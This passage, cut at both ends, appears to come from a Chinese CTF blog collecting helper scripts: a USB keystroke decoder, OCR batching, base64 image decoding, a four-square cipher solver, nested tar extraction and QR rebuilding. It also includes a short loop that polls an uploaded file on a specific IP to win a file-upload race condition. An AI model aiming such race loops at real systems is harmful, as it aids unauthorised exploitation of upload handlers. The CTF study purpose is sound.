class="string">00:00:10:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:1c:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:13:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:04:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:1a:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:1a:12:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:12:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:15:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:07:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:1e:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:28:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">keys = keys.split(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">"usb.dat"</span></span><br><span class="line"></span><br><span class="line">presses = []</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>: <span class="string">"a"</span>, <span class="string">"05"</span>: <span class="string">"b"</span>, <span class="string">"06"</span>: <span class="string">"c"</span>, <span class="string">"07"</span>: <span class="string">"d"</span>, <span class="string">"08"</span>: <span class="string">"e"</span>, <span class="string">"09"</span>: <span class="string">"f"</span>, <span class="string">"0a"</span>: <span class="string">"g"</span>, <span class="string">"0b"</span>: <span class="string">"h"</span>, <span class="string">"0c"</span>: <span class="string">"i"</span>,</span><br><span class="line">              <span class="string">"0d"</span>: <span class="string">"j"</span>, <span class="string">"0e"</span>: <span class="string">"k"</span>, <span class="string">"0f"</span>: <span class="string">"l"</span>, <span class="string">"10"</span>: <span class="string">"m"</span>, <span class="string">"11"</span>: <span class="string">"n"</span>, <span class="string">"12"</span>: <span class="string">"o"</span>, <span class="string">"13"</span>: <span class="string">"p"</span>, <span class="string">"14"</span>: <span class="string">"q"</span>, <span class="string">"15"</span>: <span class="string">"r"</span>,</span><br><span class="line">              <span class="string">"16"</span>: <span class="string">"s"</span>, <span class="string">"17"</span>: <span class="string">"t"</span>, <span class="string">"18"</span>: <span class="string">"u"</span>, <span class="string">"19"</span>: <span class="string">"v"</span>, <span class="string">"1a"</span>: <span class="string">"w"</span>, <span class="string">"1b"</span>: <span class="string">"x"</span>, <span class="string">"1c"</span>: <span class="string">"y"</span>, <span class="string">"1d"</span>: <span class="string">"z"</span>, <span class="string">"1e"</span>: <span class="string">"1"</span>,</span><br><span class="line">              <span class="string">"1f"</span>: <span class="string">"2"</span>, <span class="string">"20"</span>: <span class="string">"3"</span>, <span class="string">"21"</span>: <span class="string">"4"</span>, <span class="string">"22"</span>: <span class="string">"5"</span>, <span class="string">"23"</span>: <span class="string">"6"</span>, <span class="string">"24"</span>: <span class="string">"7"</span>, <span class="string">"25"</span>: <span class="string">"8"</span>, <span class="string">"26"</span>: <span class="string">"9"</span>, <span class="string">"27"</span>: <span class="string">"0"</span>,</span><br><span class="line">              <span class="string">"28"</span>: <span class="string">"&lt;RET&gt;"</span>, <span class="string">"29"</span>: <span class="string">"&lt;ESC&gt;"</span>, <span class="string">"2a"</span>: <span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>: <span class="string">"\t"</span>, <span class="string">"2c"</span>: <span class="string">"&lt;SPACE&gt;"</span>, <span class="string">"2d"</span>: <span class="string">"-"</span>, <span class="string">"2e"</span>: <span class="string">"="</span>, <span class="string">"2f"</span>: <span class="string">"["</span>,</span><br><span class="line">              <span class="string">"30"</span>: <span class="string">"]"</span>, <span class="string">"31"</span>: <span class="string">"\\"</span>, <span class="string">"32"</span>: <span class="string">"&lt;NON&gt;"</span>, <span class="string">"33"</span>: <span class="string">";"</span>, <span class="string">"34"</span>: <span class="string">"'"</span>, <span class="string">"35"</span>: <span class="string">"&lt;GA&gt;"</span>, <span class="string">"36"</span>: <span class="string">","</span>, <span class="string">"37"</span>: <span class="string">"."</span>, <span class="string">"38"</span>: <span class="string">"/"</span>,</span><br><span class="line">              <span class="string">"39"</span>: <span class="string">"&lt;CAP&gt;"</span>, <span class="string">"3a"</span>: <span class="string">"&lt;F1&gt;"</span>, <span class="string">"3b"</span>: <span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>: <span class="string">"&lt;F3&gt;"</span>, <span class="string">"3d"</span>: <span class="string">"&lt;F4&gt;"</span>, <span class="string">"3e"</span>: <span class="string">"&lt;F5&gt;"</span>, <span class="string">"3f"</span>: <span class="string">"&lt;F6&gt;"</span>,</span><br><span class="line">              <span class="string">"40"</span>: <span class="string">"&lt;F7&gt;"</span>, <span class="string">"41"</span>: <span class="string">"&lt;F8&gt;"</span>, <span class="string">"42"</span>: <span class="string">"&lt;F9&gt;"</span>, <span class="string">"43"</span>: <span class="string">"&lt;F10&gt;"</span>, <span class="string">"44"</span>: <span class="string">"&lt;F11&gt;"</span>, <span class="string">"45"</span>: <span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>: <span class="string">"A"</span>, <span class="string">"05"</span>: <span class="string">"B"</span>, <span class="string">"06"</span>: <span class="string">"C"</span>, <span class="string">"07"</span>: <span class="string">"D"</span>, <span class="string">"08"</span>: <span class="string">"E"</span>, <span class="string">"09"</span>: <span class="string">"F"</span>, <span class="string">"0a"</span>: <span class="string">"G"</span>, <span class="string">"0b"</span>: <span class="string">"H"</span>, <span class="string">"0c"</span>: <span class="string">"I"</span>,</span><br><span class="line">             <span class="string">"0d"</span>: <span class="string">"J"</span>, <span class="string">"0e"</span>: <span class="string">"K"</span>, <span class="string">"0f"</span>: <span class="string">"L"</span>, <span class="string">"10"</span>: <span class="string">"M"</span>, <span class="string">"11"</span>: <span class="string">"N"</span>, <span class="string">"12"</span>: <span class="string">"O"</span>, <span class="string">"13"</span>: <span class="string">"P"</span>, <span class="string">"14"</span>: <span class="string">"Q"</span>, <span class="string">"15"</span>: <span class="string">"R"</span>,</span><br><span class="line">             <span class="string">"16"</span>: <span class="string">"S"</span>, <span class="string">"17"</span>: <span class="string">"T"</span>, <span class="string">"18"</span>: <span class="string">"U"</span>, <span class="string">"19"</span>: <span class="string">"V"</span>, <span class="string">"1a"</span>: <span class="string">"W"</span>, <span class="string">"1b"</span>: <span class="string">"X"</span>, <span class="string">"1c"</span>: <span class="string">"Y"</span>, <span class="string">"1d"</span>: <span class="string">"Z"</span>, <span class="string">"1e"</span>: <span class="string">"!"</span>,</span><br><span class="line">             <span class="string">"1f"</span>: <span class="string">"@"</span>, <span class="string">"20"</span>: <span class="string">"#"</span>, <span class="string">"21"</span>: <span class="string">"$"</span>, <span class="string">"22"</span>: <span class="string">"%"</span>, <span class="string">"23"</span>: <span class="string">"^"</span>, <span class="string">"24"</span>: <span class="string">"&amp;"</span>, <span class="string">"25"</span>: <span class="string">"*"</span>, <span class="string">"26"</span>: <span class="string">"("</span>, <span class="string">"27"</span>: <span class="string">")"</span>,</span><br><span class="line">             <span class="string">"28"</span>: <span class="string">"&lt;RET&gt;"</span>, <span class="string">"29"</span>: <span class="string">"&lt;ESC&gt;"</span>, <span class="string">"2a"</span>: <span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>: <span class="string">"\t"</span>, <span class="string">"2c"</span>: <span class="string">"&lt;SPACE&gt;"</span>, <span class="string">"2d"</span>: <span class="string">"_"</span>, <span class="string">"2e"</span>: <span class="string">"+"</span>, <span class="string">"2f"</span>: <span class="string">"&#123;"</span>,</span><br><span class="line">             <span class="string">"30"</span>: <span class="string">"&#125;"</span>, <span class="string">"31"</span>: <span class="string">"|"</span>, <span class="string">"32"</span>: <span class="string">"&lt;NON&gt;"</span>, <span class="string">"33"</span>: <span class="string">"\""</span>, <span class="string">"34"</span>: <span class="string">":"</span>, <span class="string">"35"</span>: <span class="string">"&lt;GA&gt;"</span>, <span class="string">"36"</span>: <span class="string">"&lt;"</span>, <span class="string">"37"</span>: <span class="string">"&gt;"</span>, <span class="string">"38"</span>: <span class="string">"?"</span>,</span><br><span class="line">             <span class="string">"39"</span>: <span class="string">"&lt;CAP&gt;"</span>, <span class="string">"3a"</span>: <span class="string">"&lt;F1&gt;"</span>, <span class="string">"3b"</span>: <span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>: <span class="string">"&lt;F3&gt;"</span>, <span class="string">"3d"</span>: <span class="string">"&lt;F4&gt;"</span>, <span class="string">"3e"</span>: <span class="string">"&lt;F5&gt;"</span>, <span class="string">"3f"</span>: <span class="string">"&lt;F6&gt;"</span>,</span><br><span class="line">             <span class="string">"40"</span>: <span class="string">"&lt;F7&gt;"</span>, <span class="string">"41"</span>: <span class="string">"&lt;F8&gt;"</span>, <span class="string">"42"</span>: <span class="string">"&lt;F9&gt;"</span>, <span class="string">"43"</span>: <span class="string">"&lt;F10&gt;"</span>, <span class="string">"44"</span>: <span class="string">"&lt;F11&gt;"</span>, <span class="string">"45"</span>: <span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> press <span class="keyword">in</span> keys:</span><br><span class="line">    Bytes = press.split(<span class="string">":"</span>)</span><br><span class="line">    <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">"00"</span>:</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span> <span class="keyword">and</span> Bytes[<span class="number">3</span>] == <span class="string">"00"</span>:</span><br><span class="line">            result += normalKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"20"</span>:  <span class="comment"># shift key is pressed.</span></span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span> <span class="keyword">and</span> Bytes[<span class="number">3</span>] == <span class="string">"00"</span>:</span><br><span class="line">            result += shiftKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Unknow Key : %s"</span> % (Bytes[<span class="number">0</span>]))</span><br><span class="line">print(<span class="string">"[+] Found : %s"</span> % (result))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="web条件竞争脚本"><a href="#web条件竞争脚本" class="headerlink" title="web条件竞争脚本"></a>web条件竞争脚本</h2><p>通过不断访问一个文件形成条件竞争,获得flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://148.70.59.198:42534/uploads/9a155ffc4127de3a9e215a4d6f212d7f414ab49b/0bc87f6e573a0a69bc1a49c448be09b7775399c1'</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Syc'</span> <span class="keyword">in</span>  r.text:</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="文字识别脚本"><a href="#文字识别脚本" class="headerlink" title="文字识别脚本"></a>文字识别脚本</h2><p>做题时收集的文字识别脚本,调用了百度ai<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> aip <span class="keyword">import</span> AipOcr</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#获取开始时间</span></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="string">""" 你的 APPID AK SK """</span></span><br><span class="line">APP_ID = <span class="string">''</span></span><br><span class="line">API_KEY = <span class="string">''</span></span><br><span class="line">SECRET_KEY = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">client = AipOcr(APP_ID, API_KEY, SECRET_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">""" 读取图片 """</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_content</span><span class="params">(filePath)</span>:</span></span><br><span class="line">    print(filePath)</span><br><span class="line">    <span class="keyword">with</span> open(filePath, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">return</span> fp.read()</span><br><span class="line">    </span><br><span class="line"><span class="string">""" 写入文本 """</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_on_txt</span><span class="params">(content,filePath,linefeed = <span class="string">"0"</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    content：要写入的内容</span></span><br><span class="line"><span class="string">    filePath：要写入文件的路径</span></span><br><span class="line"><span class="string">    linefeed ：判断是否换行</span></span><br><span class="line"><span class="string">        - 1 为不换行 </span></span><br><span class="line"><span class="string">        - 其他 为换行</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment">#只需要将之前的”w"改为“a"即可，代表追加内容</span></span><br><span class="line">    <span class="keyword">with</span> open(filePath,<span class="string">"a"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file.write(content)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"写入错误"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> linefeed != <span class="string">"1"</span>:</span><br><span class="line">                file.write(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#图片路径</span></span><br><span class="line">img_path = <span class="string">r"D:\\ubw (2019-11-2 9-55-43)"</span> <span class="comment"># 也可采用 r" D:\Test_path" 或者是"D:/Test_path"</span></span><br><span class="line"><span class="comment">#文本路径</span></span><br><span class="line">txt_path = <span class="string">r"D:\\ubw (2019-11-2 9-55-43)\\base.txt"</span></span><br><span class="line"></span><br><span class="line">options = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#遍历所有文件（使用 os.walk 方法）</span></span><br><span class="line"><span class="keyword">for</span> root,dirs,files <span class="keyword">in</span> os.walk(img_path):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="comment"># 使用join函数将文件名称和文件所在根目录连接起来</span></span><br><span class="line">        file_dir = os.path.join(root, file)</span><br><span class="line">        print(file_dir)</span><br><span class="line">        <span class="comment"># write_on_txt("=============================",txt_path,"0")</span></span><br><span class="line">        write_on_txt(<span class="string">"文件名:"</span>+ file_dir,txt_path,<span class="string">"0"</span>)</span><br><span class="line">        <span class="comment">#判断是否是图片</span></span><br><span class="line">        <span class="keyword">if</span> file_dir[<span class="number">-4</span>:]==<span class="string">".png"</span><span class="keyword">or</span> file_dir[<span class="number">-4</span>:]==<span class="string">".jpg"</span>:</span><br><span class="line">            <span class="comment">#传入图片</span></span><br><span class="line">            image = get_file_content(file_dir)</span><br><span class="line">            <span class="string">""" 调用通用文字识别, 图片参数为本地图片 """</span></span><br><span class="line">            a = client.basicGeneral(image, options)</span><br><span class="line">            <span class="comment"># 查看返回的结果</span></span><br><span class="line">            <span class="comment"># print(a['words_result'])</span></span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">for</span> dic <span class="keyword">in</span> a[<span class="string">'words_result'</span>]:</span><br><span class="line">                print(dic[<span class="string">'words'</span>])</span><br><span class="line">                write_on_txt(dic[<span class="string">'words'</span>],txt_path,<span class="string">"0"</span>)</span><br><span class="line">                    </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Running time: %1.2f Seconds'</span>%(end-start))</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="解base64图片-PHP脚本"><a href="#解base64图片-PHP脚本" class="headerlink" title="解base64图片(PHP脚本)"></a>解base64图片(PHP脚本)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgBase64ToFile</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"> </span><br><span class="line">        $dir_path = realpath(<span class="string">"./"</span>) ;</span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir_path)) &#123;</span><br><span class="line">            mkdir($dir_path, <span class="number">0777</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $base64_image_content = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (!$base64_image_content || !$dir_path) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = <span class="keyword">array</span>();</span><br><span class="line">        $new_file = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^(data:\s*image\/(\w+);base64,)/'</span>, $base64_image_content, $result)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>($result[<span class="number">2</span>])) &#123;</span><br><span class="line">                $type = $result[<span class="number">2</span>];</span><br><span class="line">                $new_file = $dir_path . time() . <span class="string">".&#123;$type&#125;"</span>;</span><br><span class="line">                file_put_contents($new_file, base64_decode(str_replace($result[<span class="number">1</span>], <span class="string">''</span>, $base64_image_content)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        print_r($new_file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;img src=".'</span>.$new_file.<span class="string">'"/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">imgBase64ToFile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="四方解密脚本"><a href="#四方解密脚本" class="headerlink" title="四方解密脚本"></a>四方解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">matrix = <span class="string">'ABCDEFGHIJKLMNOPRSTUVWXYZ'</span></span><br><span class="line">pla = <span class="string">'abcdefghijklmnoprstuvwxyz'</span></span><br><span class="line">key1 = <span class="string">'[HELLO]'</span></span><br><span class="line">key2 = <span class="string">'[WORLD]'</span></span><br><span class="line">key1 = <span class="string">''</span>.join(collections.OrderedDict.fromkeys(key1))</span><br><span class="line">key2 = <span class="string">''</span>.join(collections.OrderedDict.fromkeys(key2))</span><br><span class="line"></span><br><span class="line">matrix1 = re.sub(<span class="string">'[\[\]]'</span>,<span class="string">''</span>,key1) + re.sub(key1,<span class="string">''</span>,matrix)</span><br><span class="line">matrix2 = re.sub(<span class="string">'[\[\]]'</span>,<span class="string">''</span>,key2) + re.sub(key2,<span class="string">''</span>,matrix)</span><br><span class="line"></span><br><span class="line">matrix_list1 = []</span><br><span class="line">matrix_list2 = []</span><br><span class="line">pla_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(matrix1),<span class="number">5</span>):</span><br><span class="line">    matrix_list1.append(list(matrix1[i:i+<span class="number">5</span>]))</span><br><span class="line"><span class="comment">#print matrix_list1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(matrix2),<span class="number">5</span>):</span><br><span class="line">    matrix_list2.append(list(matrix2[i:i+<span class="number">5</span>]))</span><br><span class="line"><span class="comment">#print matrix_list2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(pla),<span class="number">5</span>):</span><br><span class="line">    pla_list.append(list(pla[i:i+<span class="number">5</span>]))</span><br><span class="line"><span class="comment">#print pla_list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询两个密文字母位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_index1</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(matrix_list1)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(matrix_list1[i])):</span><br><span class="line">            <span class="keyword">if</span> matrix_list1[i][j] == x:</span><br><span class="line">                <span class="keyword">return</span> i,j</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_index2</span><span class="params">(y)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(len(matrix_list2)):</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(len(matrix_list2[k])):</span><br><span class="line">            <span class="keyword">if</span> matrix_list2[k][l] == y:</span><br><span class="line">                <span class="keyword">return</span> k,l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_pla</span><span class="params">(letter)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#两个子母中第一个字母位置</span></span><br><span class="line">    first = find_index1(letter[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment">#两个子母中第二个字母位置</span></span><br><span class="line">    second = find_index2(letter[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    pla = <span class="string">''</span></span><br><span class="line">    pla += pla_list[first[<span class="number">0</span>]][second[<span class="number">1</span>]]</span><br><span class="line">    pla += pla_list[second[<span class="number">0</span>]][first[<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pla</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cip = <span class="string">'BLMIMTOWUNCBMD'</span></span><br><span class="line">    pla = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cip),<span class="number">2</span>):</span><br><span class="line">        pla += gen_pla(cip[i:i+<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">print</span> pla</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="连续解压压缩包脚本"><a href="#连续解压压缩包脚本" class="headerlink" title="连续解压压缩包脚本"></a>连续解压压缩包脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">  tf = tarfile.open(str(i)+<span class="string">".tar"</span>)</span><br><span class="line">  tf.extractall()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="将javascript处理后的编码还原成QR图片脚本"><a href="#将javascript处理后的编码还原成QR图片脚本" class="headerlink" title="将javascript处理后的编码还原成QR图片脚本"></a>将javascript处理后的编码还原成QR图片脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line">b = list(map(int, <span class="string">''</span>.split(<span class="string">' '</span>)))</span><br><span class="line">png_header = <span class="string">'89504e470d0a1a0a0000000d49484452'</span></span><br><span class="line">png_header = [png_header[i*<span class="number">2</span>:(i+<span class="number">1</span>)*<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> 